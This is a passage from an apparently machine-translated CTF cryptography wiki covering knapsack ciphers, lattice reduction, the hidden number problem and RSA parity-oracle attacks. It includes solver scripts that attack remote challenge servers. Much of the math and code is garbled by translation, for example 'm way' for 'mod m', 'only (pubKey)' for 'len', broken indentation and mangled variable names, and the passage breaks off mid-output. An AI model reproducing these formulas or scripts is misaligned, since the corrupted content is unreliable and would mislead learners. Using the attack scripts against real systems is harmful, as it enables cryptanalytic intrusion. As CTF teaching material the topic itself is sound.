<p>First, we generate the modulus m of the modular multiplication, here we want to make sure</p> <p>$$</p> <p>m&gt;\\sum_{i=1}^{i=n}a_i</p> <p>$$</p> <p>Second, we choose the multiplier w of the modular multiplication as the private key and ensure</p> <p>$$</p> <p>gcd(w,m)=1</p> <p>$$</p> <p>After that, we can generate the public key by the following formula.</p> <p>$$</p> <p>b_i \\equiv w a_i \\bmod m</p> <p>$$</p> <p>And this new backpack set b_i and m as the public key.</p>"},{"location":"crypto/asymmetric/knapsack/knapsack/#encryption-and-decryption","title":"encryption and decryption","text":""},{"location":"crypto/asymmetric/knapsack/knapsack/#encryption","title":"Encryption","text":"<p>Suppose we want to encrypt the plaintext as v, each bit is v_i, then the result of our encryption is</p> <p>$$</p> <p> Sum_ {i = 1} ^ {n} i = b_iv_i  m way $$</p>"},{"location":"crypto/asymmetric/knapsack/knapsack/#decryption","title":"Decryption","text":"<p>For the decryption side, we can first ask for the inverse of m^{-1} for m.</p> <p>Then we can multiply the obtained ciphertext by w^{-1} to get the plaintext, because</p> <p>$$</p> <p> Sum_ {i = 1} ^ {w} i = n ^ {- 1} b_iv_i  way m =  sum_ {i = 1} ^ {n} i = a_iv_i  m way $$</p> <p>here has</p> <p>$$</p> <p>b_i \\equiv w a_i \\bmod m</p> <p>$$</p> <p>The encrypted message for each block is less than m, so the result is naturally plaintext.</p>"},{"location":"crypto/asymmetric/knapsack/knapsack/#_1","title":"\u7834","text":"<p>The system was deciphered two years after the proposed encryption system. The basic idea of deciphering is that we do not necessarily need to find the correct multiplier w (ie trapdoor information), just find the arbitrary modulus <code>m&amp;#39;</code> and The multiplier <code>w&amp;#39;</code> can be used to generate a super-incrementing backpack vector by using <code>w&amp;#39;</code> to multiply the public backpack vector B.</p>"},{"location":"crypto/asymmetric/knapsack/knapsack/#examples","title":"Examples","text":"<p>Here we take Archaic in 2014 ASIS Cyber Security Contest Quals as an example, [topic link] (https://github.com/ctfs/write-ups-2014/tree/b02bcbb2737907dd0aa39c5d4df1d1e270958f54/asis-ctf-quals-2014/archaic ).</p> <p>First look at the source program</p> <pre><code>secret = 'CENSORED'\n\nmsg_bit = bin(int(secret.encode('hex'), 16))[2:]\n</code></pre> <p>First we get all the bits of secret.</p> <p>Second, use the following function to get the keypair, including the public and private keys.</p> <pre><code>keyPair = makeKey (curtain (msg_bit))\n</code></pre> <p>Carefully analyze the makekey function as follows</p> <pre><code>def makeKey(n):\n\nprivKey = [random.randint (1, 4 ** n)]\ns = privKey [0]\n    for i in range(1, n):\n\n        privKey.append(random.randint(s + 1, 4**(n + i)))\n\ns + = privKey [i]\nq = random.randint (privKey [n-1] + 1, 2 * privKey [n-1])\n    r = random.randint(1, q)\n\n    while gmpy2.gcd(r, q) != 1:\n\n        r = random.randint(1, q)\n\n    pubKey = [ r*w % q for w in privKey ]\n\n    return privKey, q, r, pubKey\n</code></pre> <p>It can be seen that prikey is a super-incremental sequence, and the obtained q is larger than the sum of all the numbers in prikey. In addition, we get r, which is exactly the same as q, which indicates that the encryption is a backpack encryption.</p> <p>Sure enough, the encryption function is to multiply each bit of the message by the corresponding public key and sum.</p> <pre><code>def encrypt(msg, pubKey):\n\n    msg_bit = msg\n\nn = only (pubKey)\n    cipher = 0\n\n    i = 0\n\n    for bit in msg_bit:\n\n        cipher += int(bit)*pubKey[i]\n\n        i += 1\n\n    return bin(cipher)[2:]\n</code></pre> <p>For the cracked script we use the script on [GitHub] (https://github.com/ctfs/write-ups-2014/tree/b02bcbb2737907dd0aa39c5d4df1d1e270958f54/asis-ctf-quals-2014/archaic). Make some simple modifications.</p> <pre><code>import binascii\n# open the public key and strip the spaces so we have a decent array\n\nfileKey = open (&amp;quot;pub.Key&amp;quot;, &amp;#39;rb&amp;#39;)\npubKey = fileKey.read().replace(' ', '').replace('L', '').strip('[]').split(',')\n\nnbit = only (pubKey)\n# open the encoded message\n\nfileEnc = open (&amp;quot;enc.txt&amp;quot;, &amp;#39;rb&amp;#39;)\nencoded = fileEnc.read().replace('L', '')\n\nprint \"start\"\n\n# create a large matrix of 0's (dimensions are public key length +1)\n\nA = Matrix(ZZ, nbit + 1, nbit + 1)\n\n# fill in the identity matrix\n\nfor i in xrange(nbit):\n\n    A[i, i] = 1\n\n# replace the bottom row with your public key\n\nfor i in xrange(nbit):\n\n    A[i, nbit] = pubKey[i]\n\n# last element is the encoded message\n\nA[nbit, nbit] = -int(encoded)\n\n\n\nres = A.LLL()\n\nfor i in range(0, nbit + 1):\n\n    # print solution\n\n    M = res.row(i).list()\n\n    flag = True\n\n    for m in M:\n\n        if m != 0 and m != 1:\n\n            flag = False\n\n            break\n\n    if flag:\n\n        print i, M\n\n        M = ''.join(str(j) for j in M)\n\n        # remove the last bit\n\n        M = M[:-1]\n\n        M = hex(int(M, 2))[2:-1]\n\n        print M\n</code></pre> <p>Decoded after output</p> <pre><code>295 [1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0]\n\n415349535f3962643364356664323432323638326331393536383830366130373036316365\n&amp;gt;&amp;gt;&amp;gt; import binascii\n&gt;&gt;&gt; binascii.unhexlify('415349535f3962643364356664323432323638326331393536383830366130373036316365')\n\n&amp;#39;ASIS_9bd3d5fd2422682c19568806a07061ce&amp;#39;\n</code></pre> <p>It should be noted that the matrix of res obtained by the LLL attack we only contains the 01 value is the result we want, because when we encrypt the plaintext, it will be decomposed into binary bit strings. In addition, we need to remove the last number of the corresponding row.</p> <p>flag \u662f <code>ASIS_9bd3d5fd2422682c19568806a07061ce</code>\u3002</p>"},{"location":"crypto/asymmetric/knapsack/knapsack/#title","title":"Title","text":"<ul> <li>2017 national classic</li> </ul>"},{"location":"crypto/asymmetric/lattice/cvp/","title":"CVP","text":"<p>CVP is a particularly important issue in Lattice-based cryptography.</p> <p>The basic definition of the problem is as follows: Given a set of bases and vectors \\mathbf{v} for L, find the nearest vector to \\mathbf{v} on L.</p>"},{"location":"crypto/asymmetric/lattice/cvp/#algorithms","title":"Algorithms","text":""},{"location":"crypto/asymmetric/lattice/cvp/#babais-nearest-plane-algorithm","title":"Babai's nearest plane algorithm","text":"<p>The algorithm inputs a set of lattice L (rank is n) base B and a target vector \\mathbf{t} to output an approximate solution to the CVP problem.</p> <ul> <li>The approximation factor is \\gamma = 2^{\\frac{n}{2}}</li> </ul> <p>Specific algorithm:</p> <p></p> <ul> <li>where c_j is the rounding of the coefficients in the Gram-schmidt orthogonalization, which is the rounding of proj_{b_{j}}(b).</li> </ul> <p>For the personal understanding of the second step of the algorithm: find a linear combination closest to \\mathbf{t} in the base B after the lattice basis and the orthogonalization.</p>"},{"location":"crypto/asymmetric/lattice/cvp/#babais-rounding-technique","title":"Babai\u2019s Rounding Technique","text":"<p>This algorithm is a variant of <code>Babai&amp;#39;s nearest plane algorithm</code>.</p> <p>The steps can be expressed as:</p> <pre><code>N = rank(B), w = target\n\n- B' = LLL(B)\n\n- Find a linear combination [l_0, ... l_N] such that w = sum(l_i * b'_i).\n\n* (b'_i is the i-th vector in the LLL-reduced basis B')\n\n- Round each l_i to it's closest integer l'_i.\n\n- Result v = sum(l'_i * b'_i)\n</code></pre>"},{"location":"crypto/asymmetric/lattice/cvp/#related-information","title":"related information","text":""},{"location":"crypto/asymmetric/lattice/cvp/#hidden-number-problem","title":"Hidden number problem","text":"<p>The definition of HNP is as follows:</p> <p>Given the prime p, many t \\in \\mathbb{F}_p and each corresponding MSB_{l,p}(\\alpha t), find the corresponding \\alpha.</p> <ul> <li>MSB_{l,p}(x) means any integer $u that satisfies \\lvert (x \\mod p) - u \\rvert \\le \\frac{p}{2^{l+1}} $, which is approximately l most significant digits of x \\mod p.</li> </ul> <p>According to the description in Reference 3, when l \\approx \\log^{\\frac{1}{2}}{p}, the following algorithm can solve HNP:</p> <p>We can turn this problem into a CVP problem on the lattice generated by the matrix:</p> <p>\\left[ \\begin{matrix} p &amp; 0 &amp; \\dots &amp; 0 &amp; 0 \\\\ 0 &amp; p &amp; \\ddots &amp; \\vdots &amp; \\vdots \\\\ \\vdots &amp; \\ddots &amp; \\ddots &amp; 0 &amp; \\vdots \\\\ 0 &amp; 0 &amp; \\dots &amp; p &amp; 0 \\\\ t_1 &amp; t_2 &amp; \\dots &amp; t_{n} &amp; \\frac{1}{2^{l+1}} \\end{matrix} \\right]</p> <p>We need to find the nearest vector from \\mathbf{u}=(u_1, u_2, \\dots, u_{n}, 0) on the lattice, so here we can use <code>Babai&amp;#39;s nearest plane algorithm</code>. Finally we can get a set of vectors \\mathbf{v}=(\\alpha \\cdot t_1 \\mod p, \\alpha \\cdot t_2 \\mod p, \\dots, \\frac{\\alpha}{2^{l+1} }), which calculates \\alpha.</p>"},{"location":"crypto/asymmetric/lattice/cvp/#bctf-2018-guess_number","title":"BCTF 2018 - guess_number","text":"<p>The topic provides server-side code: <pre><code>import random, sys\n\nfrom flag import FLAG\n\nimport gmpy2\n\n\n\ndef msb(k, x, p):\n\ndelta = p &amp;gt;&amp;gt; (k + 1)\nui = random.randint (x-delta, x + delta)\n    return ui\n\n\n\ndef main():\n\n    p = gmpy2.next_prime(2**160)\n\n    for _ in range(5):\n\n        alpha = random.randint(1, p - 1)\n\n        # print(alpha)\n\n        t = []\n\nu = []\nk = 10\n        for i in range(22):\n\n            t.append(random.randint(1, p - 1))\n\n            u.append(msb(k, alpha * t[i] % p, p))\n\n        print(str(t))\n\nprint (p (u))\n        guess = raw_input('Input your guess number: ')\n\n        guess = int(guess)\n\n        if guess != alpha:\n\n            exit(0)\n\n\n\nif __name__ == \"__main__\":\n\n    main()\n\n    print(FLAG)\n</code></pre></p> <p>As you can see, the program performs a total of 5 rounds. In each round, the program generates a random \\alpha and 22 random t_i. For each t_i, the program will take u_i = MSB_{10,p}(\\alpha\\cdot{t_i\\mod{p}}) and send it to the client. We need to calculate the corresponding \\alpha based on the provided t_i and u_i. As you can see, the problem is a typical Hidden number problem, so you can use the above algorithm to solve:</p> <pre><code>import socket\n\nimport ast\nimport telnetlib\n\n\n\n#HOST, PORT = 'localhost', 9999\n\nHOST, PORT = '60.205.223.220', 9999\n\n\n\ns = socket.socket()\n\ns.connect((HOST, PORT))\n\nf = s.makefile('rw', 0)\n\n\n\ndef recv_until(f, delim='\\n'):\n\nbuf = &amp;#39;&amp;#39;\n    while not buf.endswith(delim):\n\n        buf += f.read(1)\n\n    return buf\n\n\n\np = 1461501637330902918203684832716283019655932542983\n\nk = 10\n\n\ndef solve_hnp(t, u):\n\n    # http://www.isg.rhul.ac.uk/~sdg/igor-slides.pdf\n\n    M = Matrix(RationalField(), 23, 23)\n\n    for i in xrange(22):\n        M[i, i] = p\n\n        M[22, i] = t[i]\n\n\n\n    M[22, 22] = 1 / (2 ** (k + 1))\n\n\n\n    def babai(A, w):\n\n        A = A.LLL(delta=0.75)\n\n        G = A.gram_schmidt()[0]\n\n        t = w\n\n        for i in reversed(range(A.nrows())):\n\n            c = ((t * G[i]) / (G[i] * G[i])).round()\n\n            t -= A[i] * c\n\n        return w - t\n\n\n\n    closest = babai(M, vector(u + [0]))\n\n    return (closest[-1] * (2 ** (k + 1))) % p\n\n\n\nfor i in xrange(5):\n\n    t = ast.literal_eval(f.readline().strip())\n\n    u = ast.literal_eval(f.readline().strip())\n\n    alpha = solve_hnp(t, u)\n\n    recv_until(f, 'number: ')\n\n    s.send(str(alpha) + '\\n')\n\n\n\nt = telnetlib.Telnet()\n\nt.sock = s\n\nt.interact()\n</code></pre>"},{"location":"crypto/asymmetric/lattice/cvp/#reference","title":"Reference","text":"<ul> <li> <p>Lecture 3 - CVP algorithm</p> </li> <li> <p>Wikipedia</p> </li> <li> <p>Playing \u201cHide-and-Seek\u201d in Finite Fields: Hidden Number Problem and Its Applications</p> </li> <li> <p>https://www.math.auckland.ac.nz/~sgal018/crypto-book/ch18.pdf</p> </li> </ul>"},{"location":"crypto/asymmetric/lattice/introduction/","title":"Basic Introduction","text":""},{"location":"crypto/asymmetric/lattice/introduction/#lattice-definition","title":"Lattice Definition","text":"<p>The lattice is the linear combination of all integer coefficients of n (m\\geq n) linearly independent vectors b_i(1\\leq i \\leq n) of the m-dimensional Euclidean space R^m, ie L(B)=\\{\\sum\\limits_{i=1}^{n}x_ib_i:x_i \\in Z,1\\leq i \\leq n\\}</p> <p>Here B is a collection of n vectors, we call</p> <ul> <li>These n vectors a set of bases of the lattice L.</li> <li>The rank of the lattice L is n.</li> <li>The number of bits in L is m.</li> </ul> <p>If m = n, then we call this format full rank.</p> <p>Of course, the space can be other groups instead of R^m.</p>"},{"location":"crypto/asymmetric/lattice/introduction/#basic-definition-in-lattices","title":"Basic Definition in Lattices","text":""},{"location":"crypto/asymmetric/lattice/introduction/#successive-minimum","title":"Successive Minimum","text":"<p>Let lattice L be a lattice in the m-dimensional Euclidean space R^m with rank n, then the continuous minimum length of L (successive minima) is \\lambda_1,...,\\lambda_n \\in R, where for any 1 \\leq i\\leq n, \\lambda_i is the minimum value to satisfy that for i linearly independent vectors v_i, ||v_j||\\leq \\lambda_i,1\\leq j\\leq i.</p> <p>Obviously we have \\lambda_i \\leq \\lambda_j ,\\forall i &lt;j\u3002</p>"},{"location":"crypto/asymmetric/lattice/introduction/#calculating-difficult-problems-in-the-lattice","title":"Calculating Difficult Problems in the Lattice","text":"<p>Shortest Vector Problem (SVP): Given the lattice L and its base vector B, find the non-zero vector v in the lattice L such that for any other non-zero vector u in the lattice, ||v| | \\leq ||u||.</p> <p>\\gamma-Approximate Shortest Vector Problem (SVP-\\gamma): Given a fixed L, find the non-zero vector v in the lattice L such that for any other non-zero vector u in the lattice, || v|| \\leq \\gamma||u||.</p> <p>Successive Minima Problem (SMP): Given a lattice L of rank n, find n linearly independent vectors s_i in lattice L, satisfying \\lambda_i(L)=||s_i| |, 1\\leq i \\leq n.</p> <p>Shortest Independent Vector Problem (SIVP): Given a lattice L of rank n, find n linear independent vectors s_i in lattice L, satisfying ||s_i|| \\leq \\lambda_n(L), 1\\leq i \\leq n.</p> <p>Unique Shortest Vector Problem (uSVP-\\gamma): Given a fixed L, satisfying $ \\lambda_2(L) &gt; \\gamma \\lambda_1(L)$, find the shortest vector of the cell.</p> <p>Closest Vector Problem (CVP): Given the lattice L and the target vector t\\in R^m, find a non-zero vector v in a lattice such that for any non-zero vector u in the lattice , satisfy ||vt|| \\leq ||ut||.</p>"},{"location":"crypto/asymmetric/lattice/lattice-reduction/","title":"\u683c\u57fa\u89c4\u7ea6","text":""},{"location":"crypto/asymmetric/lattice/lattice-reduction/#lenstra-lenstra-lovasz","title":"Lenstra \u2013 Lenstra \u2013 Lovasz","text":""},{"location":"crypto/asymmetric/lattice/lattice-reduction/#basic-introduction","title":"basic introduction","text":"<p>The LLL algorithm is to find a set of bases on the lattice, which satisfies the following effects.</p> <p></p> <p>Moreover, the following properties of the base generated by this method are very useful.</p> <p></p>"},{"location":"crypto/asymmetric/lattice/lattice-reduction/#simple-application","title":"Simple application","text":"<p>Here I will give a second example from LLL paper. Given n real numbers \\alpha_i,...,\\alpha_n, find the rational linear approximation of the n numbers, ie find n numbers m_i, so that \\sum\\limits_{i=1}^{n }m_i\\alpha_i is equal to 0 as much as possible. We can construct a matrix like this, where a_i is a rational approximation of \\alpha_i.</p>  A = \\left[ \\begin{matrix} 1   &amp; 0 &amp; 0     &amp; \\cdots &amp; 0 &amp; ca_1     \\\\ 0   &amp; 1  &amp; 0    &amp; \\cdots &amp; 0 &amp; c a_2  \\\\ 0   &amp; 0   &amp; 1   &amp; \\cdots &amp; 0 &amp; c a_3 \\\\\\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ 0   &amp; 0   &amp;0   &amp; \\cdots &amp; 1 &amp; c a_n     \\\\ \\end{matrix} \\right] <p>The matrix is n*(n+1), we can find the determinant corresponding to this lattice according to the method of finding the determinant.</p> <p>$ Det (L) =  sqrt {AA} $ ^ T</p> <p>We further consider such a matrix</p>  A = \\left[ \\begin{matrix} 1   &amp; 0 &amp; 0     &amp; \\cdots &amp; 0 &amp; a_1     \\\\ 0   &amp; 1  &amp; 0    &amp; \\cdots &amp; 0 &amp; a_2  \\\\ 0   &amp; 0   &amp; 1   &amp; \\cdots &amp; 0 &amp; a_3 \\\\\\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ 0   &amp; 0   &amp;0   &amp; \\cdots &amp; 1 &amp; a_n     \\\\ \\end{matrix} \\right] <p>Then</p>  AA^T = \\left[ \\begin{matrix} 1+a_1^2   &amp; a_1a_2   &amp; a_1a_3 &amp; \\cdots  &amp; a_1a_n     \\\\ a_2a_1   &amp; 1+a_2^2  &amp; a_2a_3 &amp; \\cdots &amp; a_2a_n  \\\\ a_3a_1   &amp; a_3a_2   &amp; 1+a_3^2   &amp; \\cdots  &amp; a_3a_n \\\\ \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ a_na_1   &amp; a_na_2   &amp;a_na_3   &amp; \\cdots  &amp; 1+a_n^2     \\\\ \\end{matrix} \\right] <p>Further, let's try it from low-dimensional to high-dimensional (strictly prove that you can consider adding a row and a column, the upper left corner is 1), and the determinant of the lattice is</p> <p>\\sqrt{1+\\sum\\limits_{i=1}^n\\alpha_i^2}</p> <p>Can refer to the following proof of the postgraduate Yuge</p> <p></p> <p>Then after the LLL algorithm, we can get</p> <p>||b_1|| \\leq 2^{\\frac{n-1}{4}} (1+\\sum\\limits_{i=1}^n\\alpha_i^2)^{\\frac{1}{2(n+1)}}</p> <p>In general, the latter item tends to 1 when it is opened n times, because a_i is a constant and is generally not related to n, so</p> <p>||b_1|| \\leq 2^{\\frac{n-1}{4}}*k</p> <p>k is relatively small. In addition, b_1 is a linear combination of the original vectors, then</p> <p>b_1[n]=\\sum\\limits_{i=1}^{n}m_ic*a_i=c\\sum\\limits_{i=1}^{n}m_i*a_i</p> <p>Obviously if c is large enough, then the subsequent summation must be small enough to satisfy the above constraints.</p>"},{"location":"crypto/asymmetric/lattice/lattice-reduction/#reference","title":"Reference","text":"<ul> <li>Survey: Lattice Reduction Attacks on RSA</li> </ul>"},{"location":"crypto/asymmetric/lattice/overview/","title":"\u683c\u6982\u8981","text":"<p>Lattice has at least two meanings in mathematics</p> <ul> <li>Define a partial order set L on a non-empty finite set that satisfies any element a, b in set L such that a, b has a maximum lower bound, and a minimum upper bound in L. See https://en.wikipedia.org/wiki/Lattice_(order) for details.</li> <li>The definition in group theory is a subset of R^n that satisfies a certain property. Of course, it can also be other groups.</li> </ul> <p>At present, the research on the lattice mainly has the following major directions.</p> <ol> <li>The difficulty of calculating problems in the lattice, that is, the computational complexity of these problems, mainly including</li> <li>SVP problem</li> <li>CVP issues</li> <li>How to solve the difficult problem in the lattice, there are both approximate algorithms and some precision algorithms.</li> <li> <p>Lattice-based cryptanalysis, that is, how to use lattice theory to analyze some existing cryptographic algorithms.</p> <ol> <li>Knapsack cryptosystems</li> </ol> </li> <li> <p>DSA nonce biases</p> <ol> <li> <p>Factoring RSA keys with bits known</p> </li> <li> <p>Small RSA private exponents</p> </li> <li> <p>Stereotyped messages with small RSA exponents</p> </li> </ol> </li> <li> <p>How to design a new cryptosystem based on the problem of lattice difficulty, which is also one of the important research directions in the post-quantum cryptosystem.</p> <ol> <li> <p>Fully homomorphic encryption</p> </li> <li> <p>The Goldreich\u2013Goldwasser\u2013Halevi (GGH) cryptosystem</p> </li> <li> <p>The NTRU cryptosystem</p> </li> <li> <p>The Ajtai\u2013Dwork cryptosystem and the LWE cryptosystem</p> </li> </ol> </li> </ol>"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/","title":"RSA Selecting a clear ciphertext attack","text":""},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#select-plaintext-attack","title":"Select plaintext attack","text":"<p>Here is an example, if we have an encryption oracle, but we don't know n and e, then</p> <ol> <li>We can get n by encrypting oracle.</li> <li>When e is small ( e&lt;2^{64}), we can use the Pollard's kangaroo algorithm algorithm to get e. This is more obvious.</li> </ol> <p>We can encrypt 2, 4, 8, and 16. Then we can know</p> <p>$ C_2 = 2 ^ {e}  n $ way</p> <p>C_4 = $ 4 ^ {e}  n $ way</p> <p>$ C_8 = 8 ^ {e}  n $ way</p> <p>Then</p> <p>c_2^2 \\equiv c_4 \\bmod n</p> <p>c_2^3 \\equiv c_8 \\bmod n</p> <p>Therefore</p> <p>c_2^2-c_4=kn</p> <p>$ c_2 ^ 3-c_8 = tn $</p> <p>We can find the greatest common factor of kn and tn, and the big probability is n. We can also construct more examples to find n more deterministically.</p>"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#any-ciphertext-decryption","title":"Any ciphertext decryption","text":"<p>Suppose Alice creates the ciphertext C = P^e \\bmod n and sends C to Bob, and assuming we want to decrypt any ciphertext encrypted by Alice, instead of just decrypting C, then we can intercept C, and use the following steps to find P:</p> <ol> <li>Select any X\\in Z_n^{*}, ie X and N.</li> <li>Calculate Y=C \\times X^e \\bmod n</li> <li>Since we can choose to ciphertext attack, we find the decryption result corresponding to YZ=Y^d</li> <li>Then, since Z=Y^d=(C \\times X^e)^d=C^d X=P^{ed} X= PX\\bmod n, since X and N are mutually prime, we are very It is easy to find the corresponding inverse element, and then you can get P</li> </ol>"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#rsa-parity-oracle","title":"RSA parity oracle","text":"<p>Suppose there is currently an Oracle that decrypts a given ciphertext and checks the parity of the decrypted plaintext and returns the corresponding value based on parity, such as 1 for odd numbers and 0 for even numbers. Then given an encrypted ciphertext, we only need log(N) times to know the plaintext message corresponding to this ciphertext.</p>"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#principle","title":"Principle","text":"<p>Hypothesis</p> <p>P $ C = e ^  N $ way</p> <p>The first time we can send to the server</p> <p>$ C * 2 ^ = e (2P) e ^  N $ way</p> <p>The server will calculate</p> <p>2P $  N $ way</p> <p>Here</p> <ul> <li>2P is an even number and its power is even.</li> <li>N is an odd number because it is multiplied by two large prime numbers.</li> </ul> <p>Then</p> <ul> <li>The server returns an odd number, ie 2P \\bmod N is an odd number, indicating that 2P is greater than N, and an odd number of Ns is subtracted, and because 2P&lt;2N, an N is subtracted, ie \\frac{N }{2} \\leq P &lt; N, we can also consider rounding down.</li> <li>If the server returns an even number, then 2P is less than N. That is, 0\\leq P &lt; \\frac{N}{2}, we can also round down.</li> </ul> <p>Here we use mathematical induction, which assumes that at the ith time, \\frac{xN}{2^{i}} \\leq P &lt; \\frac{xN+N}{2^{i}}</p> <p>Further, at the i+1th time, we can send</p> <p>C*2^{(i+1)e}</p> <p>The server will calculate</p> <p>$ 2 ^ {i + 1} P  way N = 2 ^ {i + 1} P $ kN</p> <p>0 \\leq 2^{i+1}P-kN&lt;N </p> <p>$  frac {kN} {2 ^ {i + 1}}  leq P &lt; frac {kN + N}</p> <p>According to the result of the ith</p> <p>\\frac{2xN}{2^{i+1}} \\leq P &lt; \\frac{2xN+2N}{2^{i+1}}</p> <p>Then</p> <ul> <li>If the server returns an odd number, then k must be an odd number, k=2y+1, then \\frac{2yN+N}{2^{i+1}} \\leq P &lt; \\frac{2yN+2N}{2^ {i+1}}. At the same time, since P necessarily exists, the range obtained by the i+1 and the range obtained by the i-th must have an intersection. So y must be equal to x.</li> <li>If the server returns an even number, then k must be an even number, k=2y, where y must also be equal to x, then \\frac{2xN}{2^{i+1}} \\leq P &lt; \\frac{2xN+ N}{2^{i+1}}</li> </ul> <p>Further we can conclude</p> <pre><code>lb = 0\n\nub = N\nif server returns 1\n\nlb = (lb + ub) / 2\nelse:\n\nUB = (Ib + UB) / 2\n</code></pre> <p>Although it is divisible, that is, it is rounded down, but it does not matter that we have analyzed this problem at the beginning.</p>"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#2018-google-ctf-perfect-secrecy","title":"2018 Google CTF Perfect Secrecy","text":"<p>Here is an example of the 2018 Google CTF topic.</p> <pre><code>#!/usr/bin/env python3\n\nimport sys\n\nimport random\n\n\n\nfrom cryptography.hazmat.primitives import serialization\n\nfrom cryptography.hazmat.backends import default_backend\n\n\n\n\n\ndef ReadPrivateKey(filename):\n\n  return serialization.load_pem_private_key(\n\n      open(filename, 'rb').read(), password=None, backend=default_backend())\n\n\n\n\n\ndef RsaDecrypt(private_key, ciphertext):\n\n  assert (len(ciphertext) &lt;=\n\n          (private_key.public_key().key_size // 8)), 'Ciphertext too large'\n  return pow(\n\n      int.from_bytes(ciphertext, 'big'),\n\n      private_key.private_numbers().d,\n\n      private_key.public_key().public_numbers().n)\n\n\n\n\n\ndef Challenge(private_key, reader, writer):\n\n  try:\n\n    m0 = reader.read(1)\n\n    m1 = reader.read(1)\n\n    ciphertext = reader.read(private_key.public_key().key_size // 8)\n\n    dice = RsaDecrypt(private_key, ciphertext)\n\n    for rounds in range(100):\n\n      p = [m0, m1][dice &amp; 1]\n\nk = random.randint (0, 2)\nc = (word (p) + k)% 2\n      writer.write(bytes((c,)))\n\n    writer.flush()\n\n    return 0\n\n\n\n  except Exception as e:\n\n    return 1\n\n\n\n\n\ndef main():\n\n  private_key = ReadPrivateKey(sys.argv[1])\n\n  return Challenge(private_key, sys.stdin.buffer, sys.stdout.buffer)\n\n\n\n\n\nif __name__ == '__main__':\n\n  sys.exit(main())\n</code></pre> <p>As can be seen</p> <ul> <li>We can give the server two numbers, and the server will decide which one to use based on the decrypted ciphertext content.</li> <li>The server will use <code>random.randint(0, 2)</code> to generate a random number and output the associated random 01 byte c.</li> </ul> <p>At first glance, it seems to be completely random. Check out <code>random.randint(0, 2)</code> to know that the generated random number is bounded, so the probability of generating an even number is greater than the probability of generating an odd number, then c and p The probability of the same parity is \u2154. Furthermore, by setting m0 and m1, we can know whether the last digit of the decrypted ciphertext is 0 or 1. This is actually the RSA parity oracle.</p> <p>Exp is as follows</p> <pre><code>import gmpy2\n\nfrom pwn import *\n\nencflag = open('./flag.txt').read()\n\nencflag = encflag.encode('hex')\n\nencflag = int(encflag, 16)\n\n#context.log_level = 'debug'\n\nm = ['\\x00', '\\x07']\n\nn = 0xDA53A899D5573091AF6CC9C9A9FC315F76402C8970BBB1986BFE8E29CED12D0ADF61B21D6C281CCBF2EFED79AA7DD23A2776B03503B1AF354E35BF58C91DB7D7C62F6B92C918C90B68859C77CAE9FDB314F82490A0D6B50C5DC85F5C92A6FDF19716AC8451EFE8BBDF488AE098A7C76ADD2599F2CA642073AFA20D143AF403D1\n\ne = 65537\nflag = \"\"\n\n\n\n\n\n\n\ndef guessvalue(cnt):\n\n    if cnt[0] &gt; cnt[1]:\n\n        return 0\n\n    return 1\n\n\n\n\n\ni = 0\n\nwhile True:\n\n    cnt = dict()\n\ncnt [0] = cnt [1] = 0\n    p = remote('perfect-secrecy.ctfcompetition.com', 1337)\n\n    p.send(m[0])\n\n    p.send(m[1])\n\n    tmp = pow(2, i)\n\n    two_inv = gmpy2.invert(tmp, n)\n\n    two_cipher = gmpy2.powmod(two_inv, e, n)\n\n    tmp = encflag * two_cipher % n\n\n    tmp = hex(tmp)[2:].strip('L')\n\n    tmp = '0' * (256 - len(tmp)) + tmp\n\n    tmp = tmp.decode('hex')\n\nassert (len (tmp) == 128)\n    p.send(tmp)\n\n    #print tmp\n\n    data = \"\"\n\n    while (len(data) != 100):\n\n        data += p.recv()\n\n    for c in data:\n\ncnt [U8 (c)] + = 1\n    p.close()\n\n    flag = str(guessvalue(cnt)) + flag\n\n    print i, flag\n\n    i += 1\n</code></pre> <p>Results are as follows</p> <pre><code>6533021797450432625003726192285181680054061843303961161444459679874621880787893445342698029728203298974356255732086344166897556918532195998159983477294838449903429031335408290610431938507208444225296242342845578895553611385588996615744823221415296689514934439749745119968629875229882861818946483594948270 6533021797450432625003726192285181680054061843303961161444459679874621880787893445342698029728203298974356255732086344166897556918532195998159983477294838449903429031335408290610431938507208444225296242342845578895553611385588996615744823221415296689514934439749745119968629875229882861818946483594948270\n</code></pre> <p>After decoding, you can get flag</p> <pre><code>CTF 